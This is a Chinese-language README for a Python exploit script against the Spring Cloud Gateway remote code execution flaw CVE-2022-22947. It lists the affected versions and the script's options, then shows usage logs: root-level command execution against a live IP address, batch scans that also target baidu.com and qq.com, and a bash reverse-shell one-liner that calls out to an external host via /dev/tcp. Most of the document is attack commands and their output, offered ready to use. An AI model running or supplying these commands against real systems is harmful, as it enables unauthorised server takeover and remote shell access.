## 一、Spring Cloud Gateway远程代码执行漏洞

   危害等级：高危

   POC/EXP情况：已公开

   CNVD编号：CNNVD-2022-16402

​	CVE编号：CVE-2022-22947

## 二、影响范围：

- - VMWare Spring Cloud GateWay 3.1.0
  - VMWare Spring Cloud GateWay >=3.0.0，<=3.0.6
  - VMWare Spring Cloud GateWay <3.0.0

## 三、漏洞描述

  Spring Cloud Gateway存在远程代码执行漏洞，该漏洞是发生在Spring Cloud Gateway应用程序的Actuator端点，其在启用、公开和不安全的情况下容易受到代码注入的攻击。攻击者可利用该漏洞通过恶意创建允许在远程主机上执行任意远程请求。

## 四、CVE-2022-22947的使用

### （一）脚本特点

1、支持单个目标验证

2、支持批量漏洞验证

3、支持反弹shell

### （二）脚本参数

```
-h   查看帮助信息
-u   指定url目标
-c   指定需要执行的命令，默认执行id
-f   指定目标url文件
```

### （三）脚本使用

**1.单个目标验证**

方式一：

```shell
E:\pocs>python cve-2022-22947.py

    验证单个目标：
            1、python cve-2022-22947.py  进入交互模式后，根据提示输入目标url和需要执行的命令，注意命令的正确性
            2、python cve-2022-22947.py  -u http://example.com -c whoami
        验证多个目标
            1、python cve-2022-22947.py -f url.txt ，将需要验证的目标全部放在url目录下
        反弹shell
            1、python cve-2022-22947.py  -u http://example.com -c "bash -i >& /dev/tcp/ip/port 0>&1"
            2、进入交互模式，输入目标和反弹shell的命令

请输入一个目标url地址：http://123.58.236.76:8484
请输入想要执行的命令，默认执行id：whoami
[+]目标：http://123.58.236.76:8484 ,成功获取回显命令：['root\\n']
```

方式二：

```shell
E:\learn\python\pocs\pocs>python cve-2022-22947.py -u http://123.58.236.76:8484 -c whoami

    验证单个目标：
            1、python cve-2022-22947.py  进入交互模式后，根据提示输入目标url和需要执行的命令，注意命令的正确性
            2、python cve-2022-22947.py  -u http://example.com -c whoami
        验证多个目标
            1、python cve-2022-22947.py -f url.txt ，将需要验证的目标全部放在url目录下
        反弹shell
            1、python cve-2022-22947.py  -u http://example.com -c "bash -i >& /dev/tcp/ip/port 0>&1"
            2、进入交互模式，输入目标和反弹shell的命令

[+]目标：http://123.58.236.76:8484 ,成功获取回显命令：['root\\n']
```

**2、批量验证**

```shell
E:\learn\python\pocs\pocs>python cve-2022-22947.py -f url.txt

    验证单个目标：
            1、python cve-2022-22947.py  进入交互模式后，根据提示输入目标url和需要执行的命令，注意命令的正确性
            2、python cve-2022-22947.py  -u http://example.com -c whoami
        验证多个目标
            1、python cve-2022-22947.py -f url.txt ，将需要验证的目标全部放在url目录下
        反弹shell
            1、python cve-2022-22947.py  -u http://example.com -c "bash -i >& /dev/tcp/ip/port 0>&1"
            2、进入交互模式，输入目标和反弹shell的命令

[+]目标：http://123.58.236.76:8484 ,成功获取回显命令：['uid=0(root']
[+]目标：http://123.58.236.76:8484 ,成功获取回显命令：['uid=0(root']
[+]目标：http://123.58.236.76:8484 ,成功获取回显命令：['uid=0(root']
[-]目标：http://www.baidu.com,漏洞验证失败，请手动验证!
[-]目标：http://www.qq.com,漏洞验证失败，请手动验证!
[+]目标：http://123.58.236.76:8484 ,成功获取回显命令：['uid=0(root']
```

**3.反弹shell**

```shell
python cve-2022-22947.py -u http://123.58.236.76:8484 -c "bash -i >& /dev/tcp/139.9.188.13/65534 0>&1"
```

![image-20220519233354807](E:\learn\python\pocs\pocs\Readme.assets\image-20220519233354807.png)

![image-20220519233429912](E:\learn\python\pocs\pocs\Readme.assets\image-20220519233429912.png)